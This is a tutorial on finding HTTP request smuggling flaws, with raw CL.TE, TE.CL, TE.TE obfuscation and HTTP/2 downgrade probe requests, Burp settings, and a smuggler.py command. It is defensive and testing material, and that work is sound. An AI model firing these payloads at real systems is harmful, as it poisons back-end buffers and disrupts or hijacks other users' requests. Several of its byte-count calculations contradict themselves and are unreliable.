# Finding HTTP Request Smuggling Vulnerabilities

Detection is the most critical phase of a request smuggling engagement because every confirmation technique that uses differential responses carries a real risk of disrupting legitimate users on a live application — the smuggled prefix poisons the back-end buffer and the very next request to arrive, whether yours or a real user's, will be the one that receives the anomalous response. A disciplined, ordered methodology — timing first, differential response second, automated tooling as a supplement — minimises collateral damage while building the evidence trail needed to confirm variant, scope, and exploitability. 

**Fundamental principle: Both timing-based and differential-response detection techniques work by creating a deliberate mismatch between what the front-end and back-end believe is in the request body — timing exploits the resulting wait state, differential responses exploit the resulting buffer contamination — and the two techniques must be attempted in the correct order to avoid poisoning real user traffic before a vulnerability is even confirmed.**

***

## Pre-Test: Burp Suite Configuration

```
Before any request smuggling testing:
─────────────────────────────────────────────────────────────────────────────
1. DISABLE "Update Content-Length" in Burp Repeater
   Repeater menu (top bar) → uncheck "Update Content-Length"
   → Burp will NOT auto-recalculate Content-Length when you edit the body
   → Critical: auto-update breaks both timing and differential response tests

2. FORCE HTTP/1.1 if the site supports HTTP/2
   Request attributes panel (right-side Inspector) → Protocol → HTTP/1
   → Burp defaults to HTTP/2 for HTTP/2-capable sites; smuggling requires HTTP/1
   → Some labs are HTTP/2-capable but the vulnerability is HTTP/1.1 only

3. SET A LONG TIMEOUT for timing-based detection
   Burp → Settings → Network → Connections → HTTP → Response timeout: 30000ms
   → A 10–20 second delay is the timing signal; default short timeouts miss it

4. SEPARATE CONNECTIONS for differential response tests
   Burp Repeater → each tab = its own connection by default ✓
   → Attack request and normal request MUST use separate connections
   → Sending both from the same connection would make the normal request
      part of the same body and defeat the test entirely

5. IDENTIFY INFRASTRUCTURE FIRST
   Look for:
     Via: 1.1 cloudflare                 → Cloudflare CDN in front
     Server: nginx  +  X-Powered-By: PHP → separate front/back-end tiers
     CF-Cache-Status: DYNAMIC            → indicates Cloudflare passthrough
     X-Backend-Server: app01             → reveals back-end identity
     Connection: keep-alive in response  → persistent connection reuse ✓
   → Single-server setups are generally not vulnerable to classic CL.TE/TE.CL
   → Absence of Via / proxy indicators may mean single server → adjust expectations
```

***

## Phase 1: Timing-Based Detection

Timing detection is blind (no response content analysis required), low-noise, and the correct first step. It does not poison the buffer — it merely sends an incomplete request and measures whether the back-end waits for missing data. 

### CL.TE Timing Test

```http
# ── WHAT THIS TESTS ───────────────────────────────────────────────────────────
# Hypothesis: front-end uses Content-Length; back-end uses Transfer-Encoding.
# If true: front-end truncates the body at CL=4 ("1\r\nA\r\n") and forwards it.
# Back-end reads TE: chunked → sees chunk "1" (1 byte, "A") → expects NEXT chunk.
# Next chunk never arrives (front-end cut off "X") → back-end WAITS → time delay.

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4             ← tells front-end: body = 4 bytes only → forwards "1\r\nA\r\n"
                                 (4 bytes = "1", "\r\n", "A", "\r\n")

1                             ← chunk size: 1 byte
A                             ← chunk data: "A"
X                             ← X is CUT OFF by front-end (beyond CL=4)
                                 back-end never receives X → no terminating "0" chunk
                                 → back-end waits for next chunk → TIMEOUT ✓

# ── BODY BYTE COUNT ───────────────────────────────────────────────────────────
# "1\r\nA\r\n" =  '1'=1, '\r'=1, '\n'=1, 'A'=1 = 4 bytes ← CL=4 ✓
# "X\r\n"      = these bytes are NOT forwarded by front-end (beyond CL boundary)
# Back-end receives: "1\r\nA\r\n" only → valid first chunk but no terminator

# ── EXPECTED RESULTS ──────────────────────────────────────────────────────────
# CL.TE PRESENT:   response delayed 10–30 seconds → eventually 408 timeout
#                  or the connection hangs until server's read timeout fires
# CL.TE ABSENT:    response arrives immediately (200 OK or normal response)
#                  → either single server, or both use same header, or CL takes priority

# ── RESPONSE TIME MEASUREMENT IN BURP REPEATER ────────────────────────────────
# Bottom-right of response panel:
# Response time: 10,243ms  ← 10+ seconds → strong signal of CL.TE ✓
# Response time:    187ms  ← fast → not CL.TE

# ⚠ FALSE POSITIVE SOURCES:
# - Network latency (high latency sites may appear to delay regardless)
# - Server-side rate limiting holding the request
# - WAF connection inspection causing delays
# → Repeat the test 2–3 times on different endpoints to reduce false positives
```

### TE.CL Timing Test

```http
# ⚠ IMPORTANT ORDER: Test CL.TE FIRST. If CL.TE is present, the TE.CL test
# below WILL DISRUPT real users because it leaves a poisoned prefix in the buffer.
# Only proceed to TE.CL if the CL.TE test was definitively negative.

# ── WHAT THIS TESTS ───────────────────────────────────────────────────────────
# Hypothesis: front-end uses Transfer-Encoding; back-end uses Content-Length.
# If true: front-end reads TE: chunked → sees chunk "0" (zero-length = end)
# → forwards "0\r\n\r\n" (5 bytes) without "X".
# Back-end reads CL=6 → expects 6 bytes → receives only 5 → WAITS → time delay.

POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6             ← tells back-end: body = 6 bytes → reads "0\r\n\r\n"=5 then waits

0                             ← chunk size 0 = end of chunked body
                              ← front-end (TE) sees this as end → forwards only "0\r\n\r\n"
X                             ← NOT forwarded by front-end (after TE terminator)
                                 back-end (CL=6) received 5 bytes, expects 1 more → WAITS ✓

# ── BODY BYTE COUNT ───────────────────────────────────────────────────────────
# "0\r\n\r\n" = '0'=1, '\r'=1, '\n'=1, '\r'=1, '\n'=1 = 5 bytes forwarded
# CL=6: back-end expects 6 bytes → receives 5 → waits for 1 more → TIMEOUT ✓

# ── EXPECTED RESULTS ──────────────────────────────────────────────────────────
# TE.CL PRESENT:   10–30 second response delay → connection eventually times out
# TE.CL ABSENT:    immediate response

# ── WHY THE ORDER MATTERS ─────────────────────────────────────────────────────
# If CL.TE is present and you send this TE.CL probe:
# Front-end uses CL=6 → forwards "0\r\n\r\n" (5 bytes) + "X" (1 byte) = 6 bytes ✓
# Back-end uses TE → sees chunk "0" → STOPS → "X" is left in the buffer
# "X" prefix poisons the buffer → next real user's request is prefixed with "X"
# → their request line becomes "XPOST /search HTTP/1.1" → 400 Bad Request
# → REAL USER DISRUPTED before you've even confirmed a vulnerability exists ✓ (bad)

# ── MINIMUM SAFETY RULE ───────────────────────────────────────────────────────
# Always use the ordering: CL.TE timing → CL.TE differential → TE.CL timing → TE.CL differential
# Never test on endpoints with known real-time traffic without a staging environment
```

***

## Phase 2: Differential Response Confirmation

Once timing suggests a vulnerability, differential response testing confirms it and identifies the exact variant. Two requests are sent in rapid succession — the attack request to poison the buffer, then the normal request to see if the poison intercepts it. 

### CL.TE Differential Response

```http
# ── ATTACK REQUEST ────────────────────────────────────────────────────────────
# Goal: smuggle "GET /404 HTTP/1.1\r\nFoo: x" into the back-end buffer.
# The smuggled prefix will be prepended to the next request's start line.

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49            ← front-end (CL) forwards 49 bytes of body
Transfer-Encoding: chunked    ← back-end (TE) reads chunks

e                             ← chunk size: 0xe = 14 decimal bytes
q=smuggling&x=               ← 14 bytes of legitimate body ✓
0                             ← chunk terminator → back-end STOPS HERE

GET /404 HTTP/1.1             ← back-end stops before this → left in buffer ✓
Foo: x                        ← open header with no value yet

# ── BODY BYTE COUNT VERIFICATION ─────────────────────────────────────────────
# "e\r\n"          = 3 bytes
# "q=smuggling&x=" = 14 bytes
# "\r\n"           = 2 bytes
# "0\r\n"          = 3 bytes
# "\r\n"           = 2 bytes
# "GET /404 HTTP/1.1\r\n" = 20 bytes
# "Foo: x"         = 6 bytes
# Total:           = 50 bytes... adjust CL to match actual byte count

# ⚠ Do NOT let Burp recalculate Content-Length — that would break the attack
# Manually count body bytes:
# chunk line + chunk data + CRLF + "0\r\n\r\n" + smuggled prefix
# All bytes UP TO and INCLUDING "Foo: x" must total exactly Content-Length value

# ── NORMAL REQUEST (sent immediately after attack request, DIFFERENT connection) ──

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

# ── WHAT THE BACK-END PROCESSES ───────────────────────────────────────────────
#
# Back-end buffer (just after attack request processed):
#   "GET /404 HTTP/1.1\r\nFoo: x"   ← smuggled prefix
#
# When normal request arrives, back-end concatenates:
#   GET /404 HTTP/1.1
#   Foo: xPOST /search HTTP/1.1     ← "Foo: x" value = start of victim's request
#   Host: vulnerable-website.com
#   Content-Type: application/x-www-form-urlencoded
#   Content-Length: 11
#
#   q=smuggling
#
# Back-end sees: method=GET, path=/404 → 404 Not Found ✓
#
# ── INTERPRETING RESULTS ──────────────────────────────────────────────────────
# Normal request receives 404 → CL.TE CONFIRMED ✓
# Normal request receives 200 → either:
#   a) Attack missed (different back-end instance via load balancing) → retry
#   b) No CL.TE vulnerability on this endpoint → try different endpoint
#   c) Timing issue (another user's request arrived between attack + normal) → retry
#
# ── RETRY STRATEGY ────────────────────────────────────────────────────────────
# If confirmation is inconsistent:
# → Try up to 5 times before concluding negative
# → Vary the smuggled path (/doesnotexist-xyz to avoid legitimate cached 404s)
# → Try on a different endpoint that uses the same routing
# → Use Turbo Intruder to send the attack + normal pair in rapid sequence
```

### TE.CL Differential Response

```http
# ⚠ Burp Repeater setting reminder: "Update Content-Length" must be UNCHECKED
# ⚠ Final "0" MUST be followed by \r\n\r\n (two CRLFs) — include them explicitly

# ── ATTACK REQUEST ────────────────────────────────────────────────────────────
# Goal: smuggle a complete GET /404 request into the buffer.
# Front-end (TE) processes chunks and forwards all. Back-end (CL=4) reads only 4 bytes.

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4             ← back-end (CL) reads exactly 4 bytes: "7c\r\n" → STOPS
Transfer-Encoding: chunked    ← front-end (TE) processes chunks → forwards ALL

7c                            ← chunk size: 0x7c = 124 decimal bytes
GET /404 HTTP/1.1             ← these 124 bytes are the chunk data
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0                             ← chunk terminator → front-end considers body complete
                              ← (followed by \r\n\r\n)

# ── BODY BYTE COUNT VERIFICATION ─────────────────────────────────────────────
# Back-end reads CL=4 bytes: "7c\r\n" = '7'=1, 'c'=1, '\r'=1, '\n'=1 = 4 bytes ✓
# Back-end STOPS after "7c\r\n" → everything from "GET /404..." left in buffer ✓
#
# Front-end chunk byte count (must equal 0x7c = 124 bytes):
# "GET /404 HTTP/1.1\r\n"                        = 18 bytes
# "Host: vulnerable-website.com\r\n"             = 30 bytes
# "Content-Type: application/x-www-form-urlencoded\r\n" = 49 bytes
# "Content-Length: 144\r\n"                      = 22 bytes
# "\r\n"                                         = 2 bytes
# "x="                                           = 2 bytes
# Total: 123 bytes → adjust chunk header if needed (must be exact)

# ── WHAT THE BACK-END PROCESSES ───────────────────────────────────────────────
#
# Back-end buffer after processing attack:
#   GET /404 HTTP/1.1
#   Host: vulnerable-website.com
#   Content-Type: application/x-www-form-urlencoded
#   Content-Length: 144       ← back-end will absorb 144 bytes of NEXT request as body
#
#   x=
#
# When normal request arrives, back-end sees it as the BODY of the smuggled GET:
#   GET /404 HTTP/1.1
#   ...
#   Content-Length: 144
#
#   x=
#   0                         ← original chunk terminator absorbed as body
#   POST /search HTTP/1.1     ← victim's request absorbed as body content
#   Host: vulnerable-website.com
#   ...
#
# Back-end: method=GET, path=/404 → 404 Not Found → TE.CL CONFIRMED ✓

# ── CRITICAL: Content-Length in smuggled request controls absorption ───────────
# The CL in the smuggled GET /404 determines how many bytes of the NEXT
# request are absorbed as the body of the smuggled request.
# Too small → normal request not fully absorbed → may not trigger 404
# Too large → back-end waits for more body data → timeout instead of 404
# Start with CL: 144 and adjust based on observed response
```

***

## Practical Considerations and Edge Cases

```
─────────────────────────────────────────────────────────────────────────────
CRITICAL RULES FOR DIFFERENTIAL RESPONSE TESTING
─────────────────────────────────────────────────────────────────────────────

Rule 1: Use SEPARATE network connections for attack and normal requests
  ✗ Same connection: normal request becomes part of the SAME body
    → never reaches the back-end as an independent request → false negative
  ✓ Two separate Burp Repeater tabs → each gets its own TCP connection

Rule 2: Use the SAME URL and parameters in both requests
  ✗ Different URLs:
    → Load balancer may route each to a DIFFERENT back-end instance
    → Attack poisons buffer on back-end A; normal request goes to back-end B
    → Normal request never hit the poisoned buffer → false negative
  ✓ Same endpoint, same parameters → maximises routing to same back-end

Rule 3: Send the normal request IMMEDIATELY after the attack request
  ✗ Long gap between requests:
    → Another real user's request may arrive first and hit the poisoned buffer
    → Their request returns the 404, not yours → you get a false negative
    → Real user gets disrupted → ethical harm
  ✓ Attack then immediately switch to normal tab and send → race window minimised

Rule 4: Expect to retry 3–5 times
  → Load balancers distribute across multiple back-end instances
  → First attempt may route to a different instance
  → Retry until the normal request lands on the same poisoned instance

Rule 5: Watch for unintended victims
  → If you see an anomalous response you didn't expect (wrong status/content)
     and it's NOT the response to your normal request, a real user was hit
  → Stop testing immediately if real users are being disrupted
  → Defer to a lower-traffic window or staging environment

─────────────────────────────────────────────────────────────────────────────
LOAD BALANCER BEHAVIOUR AND ROUTING
─────────────────────────────────────────────────────────────────────────────

Round-robin load balancing:
  [Request 1: attack]  → Back-end instance A (buffer poisoned on A)
  [Request 2: normal]  → Back-end instance B (clean buffer → 200 OK → false negative)
  [Request 3: attack]  → Back-end instance B (buffer poisoned on B)
  [Request 4: normal]  → Back-end instance A (clean → 200 OK → false negative)

Session affinity / sticky sessions:
  [All requests from same IP] → Same back-end instance
  → If session affinity is in use, all requests land on same back-end → easier detection

Connection affinity:
  [All requests on same TCP connection] → Same back-end
  → HTTP/1.1 keep-alive = requests on same connection may hit same back-end
  → BUT: attack and normal MUST use separate connections (see Rule 1)
  → The trade-off: same connection = same back-end BUT defeats the test mechanism

Dealing with inconsistent routing:
  → Try 5–10 pairs before concluding negative on a load-balanced target
  → Observe which back-end server IDs appear in response headers (X-Backend-Server)
  → If different server IDs appear → round-robin confirmed → need more retries
```

***

## Automated Detection: HTTP Request Smuggler

```
# ── BURP BAPP: HTTP Request Smuggler ─────────────────────────────────────────
# Install: BApp Store → "HTTP Request Smuggler"

# ── BASIC USAGE: Smuggle Probe ────────────────────────────────────────────────
# 1. Capture a POST request in Burp Proxy (to the target application)
# 2. Send to Burp Repeater
# 3. Right-click request → Extensions → HTTP Request Smuggler → Smuggle Probe

# The extension runs:
#   • CL.TE timing probe
#   • TE.CL timing probe
#   • CL.TE differential response
#   • TE.CL differential response
#   • All TE.TE obfuscation variants (Transfer-Encoding: xchunked, tab, etc.)
#   • H2.CL / H2.TE if HTTP/2 is detected
#   • CL.0 probe (for servers that ignore body on certain paths)

# Output locations:
#   Burp Suite Professional: Dashboard → Issues (shows vulnerability type + evidence)
#   Burp Suite Community:    Extensions → Installed → HTTP Request Smuggler → Output

# Example output:
# [HTTP Request Smuggler] Issue found: CL.TE
# URL: https://vulnerable-website.com/
# Evidence: Timing delay of 12.3s observed
# Differential: Subsequent request returned 404 (expected 200)
# Confidence: Firm

# ── FULL SCAN MODE: Guess All Headers ─────────────────────────────────────────
# Right-click → Extensions → HTTP Request Smuggler → Smuggle attack (CL.TE)
#   OR
# Right-click → Extensions → HTTP Request Smuggler → Smuggle attack (TE.CL)
# → Generates and sends the confirmed attack payload automatically

# ── BURP SCANNER (Professional) ───────────────────────────────────────────────
# Active scan automatically probes for CL.TE, TE.CL, and TE.TE.
# Target → right-click endpoint → Scan → Active scan → includes request smuggling

# ── smuggler.py (standalone CLI tool) ─────────────────────────────────────────
# GitHub: defparam/smuggler
# Usage:
python3 smuggler.py -u https://vulnerable-website.com/ -m POST

# Flags:
# -u URL      → target URL
# -m METHOD   → HTTP method (POST required for request smuggling)
# -t TIMEOUT  → timeout per probe (default 5s)
# -l LOG      → log to file

# Output:
# [+] CL.TE found on https://vulnerable-website.com/
# [+] Timing: 11.2s delay with CL.TE probe
# [+] Differential: 404 response to normal request after CL.TE attack
```

***

## Complete Detection Decision Tree

```
HTTP Request Smuggling Detection Workflow
─────────────────────────────────────────────────────────────────────────────

START
  │
  ├── Configure Burp: HTTP/1.1, disable Update Content-Length, 30s timeout
  │
  ├── STEP 1: CL.TE TIMING TEST (safe, no user impact)
  │     │
  │     ├── Delay observed (>5s)?
  │     │     YES → proceed to CL.TE differential response
  │     │     NO  → proceed to TE.CL timing test
  │     │
  │     └── CL.TE DIFFERENTIAL RESPONSE (sends two requests)
  │           Normal request returns 404?
  │             YES → CL.TE CONFIRMED ✓ → proceed to exploitation
  │             NO  → retry up to 5x → if still negative → proceed to TE.CL
  │
  ├── STEP 2: TE.CL TIMING TEST (⚠ may disrupt users if CL.TE was present)
  │     │
  │     ├── Delay observed (>5s)?
  │     │     YES → proceed to TE.CL differential response
  │     │     NO  → proceed to TE.TE obfuscation tests
  │     │
  │     └── TE.CL DIFFERENTIAL RESPONSE
  │           Normal request returns 404?
  │             YES → TE.CL CONFIRMED ✓ → proceed to exploitation
  │             NO  → retry up to 5x → if still negative → proceed to TE.TE
  │
  ├── STEP 3: TE.TE OBFUSCATION TESTS
  │     Try each TE obfuscation variant with CL.TE and TE.CL probes:
  │       Transfer-Encoding: xchunked
  │       Transfer-Encoding : chunked      (space before colon)
  │       Transfer-Encoding:[TAB]chunked   (tab separator)
  │       Transfer-Encoding: chunked / Transfer-Encoding: x  (duplicate)
  │       [space]Transfer-Encoding: chunked  (leading space)
  │     │
  │     └── Timing or differential response triggered?
  │           YES → TE.TE CONFIRMED ✓ → note which obfuscation worked
  │           NO  → proceed to HTTP/2 downgrade tests
  │
  ├── STEP 4: HTTP/2 DOWNGRADE TESTS (if site supports HTTP/2)
  │     Switch Burp Repeater to HTTP/2 protocol
  │     Test H2.CL: inject content-length: 0 in HTTP/2 headers
  │     Test H2.TE: inject transfer-encoding: chunked in HTTP/2 headers
  │     Test CRLF injection: add \r\n to header values
  │     │
  │     └── Differential response triggered in HTTP/2 mode?
  │           YES → H2.CL or H2.TE CONFIRMED ✓
  │
  └── STEP 5: CL.0 TESTS (specific endpoints only)
        Try endpoints that serve static content (JS, CSS, images)
        Send POST with CL=100 and smuggled request in body
        Follow with normal GET
        GET returns unexpected content?
          YES → CL.0 CONFIRMED ✓

─────────────────────────────────────────────────────────────────────────────
Throughout all phases:
  ✓ Use Burp HTTP Request Smuggler for automated parallel testing
  ✓ Same URL in attack and normal requests
  ✓ Separate connections for attack and normal requests
  ✓ Send normal request within 1–2 seconds of attack request
  ✓ Stop immediately if real users show signs of disruption
─────────────────────────────────────────────────────────────────────────────
```
